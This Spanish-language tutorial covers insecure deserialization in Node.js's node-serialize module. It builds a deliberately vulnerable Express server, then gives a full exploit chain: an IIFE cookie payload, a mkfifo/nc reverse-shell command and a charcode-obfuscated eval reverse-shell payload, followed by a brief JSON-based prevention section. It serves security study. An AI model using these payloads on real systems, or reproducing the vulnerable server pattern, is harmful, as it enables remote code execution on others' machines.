# INSECURE DESERIALIZATION JAVASCRIPT



## Table of contents

- [INSECURE DESERIALIZATION JAVASCRIPT](#insecure-deserialization-javascript)
  - [Serializacion vs. Deserializacion](#serializacion-vs-deserializacion)
    - [¿Qué es la serialización?](#qu-es-la-serializacin)
    - [¿Qué es la deserialización?](#qu-es-la-deserializacin)
  - [¿Qué es la deserialización insegura?](#qu-es-la-deserializacin-insegura)
  - [Insecure deserialization attack in NodeJS](#insecure-deserialization-attack-in-nodejs)
  - [Prevención](#prevencin)

## Serializacion vs. Deserializacion

### ¿Qué es la serialización?

La serialización es el proceso de convertir estructuras de datos complejas, como objetos y sus campos, en un formato "más plano" que se puede enviar y recibir como un flujo secuencial de bytes. La serialización de datos hace que sea mucho más sencillo:

- Escriba datos complejos en la memoria entre procesos, un archivo o una base de datos.
- Envíe datos complejos, por ejemplo, a través de una red, entre diferentes componentes de una aplicación o en una llamada API.

Fundamentalmente, al serializar un objeto, su estado también se conserva. En otras palabras, se conservan los atributos del objeto, junto con sus valores asignados.

### ¿Qué es la deserialización?

La deserialización es el proceso de restaurar este flujo de bytes a una réplica completamente funcional del objeto original, en el estado exacto en que se serializó. La lógica del sitio web puede entonces interactuar con este objeto deserializado, como lo haría con cualquier otro objeto.

Muchos lenguajes de programación ofrecen soporte nativo para serialización. Exactamente cómo se serializan los objetos depende del idioma. Algunos lenguajes serializan objetos en formatos binarios, mientras que otros usan diferentes formatos de cadena, con diversos grados de legibilidad humana. Tenga en cuenta que todos los atributos del objeto original se almacenan en el flujo de datos serializados, incluidos los campos privados.

## ¿Qué es la deserialización insegura?

La deserialización insegura es cuando un sitio web deserializa los datos controlables por el usuario. Esto potencialmente permite que un atacante manipule objetos serializados para pasar datos dañinos al código de la aplicación.

Incluso es posible reemplazar un objeto serializado con un objeto de una clase completamente diferente. De manera alarmante, los objetos de cualquier clase que esté disponible en el sitio web serán deserializados e instanciados, independientemente de la clase que se esperaba. Por esta razón, la deserialización insegura a veces se conoce como una vulnerabilidad de "inyección de objetos".

Un objeto de una clase inesperada puede causar una excepción. En ese momento, sin embargo, es posible que el daño ya esté hecho. Muchos ataques basados ​​en deserialización se completan antes de que finalice la deserialización. Esto significa que el propio proceso de deserialización puede iniciar un ataque, incluso si la propia funcionalidad del sitio web no interactúa directamente con el objeto malicioso. Por este motivo, los sitios web cuya lógica se basa en lenguajes fuertemente tipados también pueden ser vulnerables a estas técnicas.

## Insecure deserialization attack in NodeJS

Los datos no confiables pasados a la funcion unserialize() en el módulo de serialización `node-serialize` se pueden explotar para lograr la ejecución de código arbitrario al pasar un objeto JavaScript serializado con una expresión de función invocada inmediatamente (IIFE Immediately Invoked Function Expression).

creamos un servidor vulnerable en nodeJS:

instalar node:

```bash
curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash -
sudo apt update
sudo apt install nodejs
node -v
npm -v
```

instalar librerias:

```bash
npm i express
npm i cookie-parser
npm i escape-html
npm i node-serialize
```

servidor vulnerable (server.js):

```javascript
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkFkaXR5YSIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJEZWxoaSJ9", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);
console.log("Listening on port 3000...");
```

iniciar servidor:

```bash
node server.js
```

si vemos la cookie **profile** tiene data encriptada en formato json

```json
{
	"username":"Aditya",
	"country":"india",
	"city":"Delhi"
}
```

Si cambiamos los valores de este objeto JSON y codificamos en base64 el objeto y reemplazamos el valor de nuestra cookie actual, el valor modificado se refleja en la página web.

vamos a provecharnos de esto:

Primero, creemos un script de Node.js para serializar nuestro código. (serialization.js)

```javascript
var serialize = require('node-serialize');

x = {
test : function(){ return 'hi'; }
};

console.log("Serialized: \n" + serialize.serialize(x));

```

```bash
node serialization.js
```

output:

```javascript
Serialized:
{"test":"_$$ND_FUNC$$_function (){ return 'hi'; }"}
```

Si reemplazamos el valor del parámetro de nombre de usuario con el valor del parámetro de prueba (desde arriba), el servidor no ejecutará esta función. Necesitamos hacer que esta función se invoque a sí misma agregando ()después de la función. Entonces el objeto se veria asi:

```bash
{"username": "_$$ND_FUNC$$_function (){ return 'hi'; }()" ,"country":"india","city":"Delhi"}
```

lo encodeamos en base64

```base64
eyJ1c2VybmFtZSI6ICJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IHJldHVybiAnaGknOyB9KCkiICwiY291bnRyeSI6ImluZGlhIiwiY2l0eSI6IkRlbGhpIn0=
```

si lo reemplazamos en la cookie **profile** se reflejara en la pagina "hello hi" (el hi de la funcion que agregamos)

Modifiquemos **serialize.js** para que nuestra función ahora nos dé un shell inverso al conectarnos a un puerto de escucha en nuestra máquina.

```javascript
var serialize = require('node-serialize');


x = {
test : function(){
  require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f", function puts(error, stdout, stderr) {});
}
};

console.log("Serialized: \n" + serialize.serialize(x));


/*
append () after the function closing bracket
*/
```

```bash
node serialization.js
```

copiamos la salida, agregamos (), lo convertimos en base64 y reemplazamos a la cookie, al colocarnos en escucha tendremos una reverse shell:

```bash
rlwrap nc -lvnp 4444
```

podemos utilizar el script [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) para crear un payload:

```bash
python nodejsshell.py <IP_KALI> <PORT_KALI>
```

output:

```bash
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

eso colocamos dentro de la funcion:

```bash
{"username": "_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10)); }()" ,"country":"india","city":"Delhi"}
```

al colocarnos a la escucha tendremos una reverse shell:

```bash
rlwrap nc -lvnp <IP_KALI>
```

También encontré un error similar en otro  módulo llamado  serialize-to-js

## Prevención

La forma correcta de serializar y deserializar objetos de JavaScript es utilizar el JSONobjeto global proporcionado. Por ejemplo:

```javascript
const object = {foo: 123};
JSON.stringify(object) // '{"foo":123}'
JSON.parse('{"foo":123}') // { foo: 123 }
```

- [https://portswigger.net/web-security/deserialization/exploiting](https://portswigger.net/web-security/deserialization/exploiting)
- [https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e](https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e)
- [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
- [https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_nodejs.html](https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_nodejs.html)
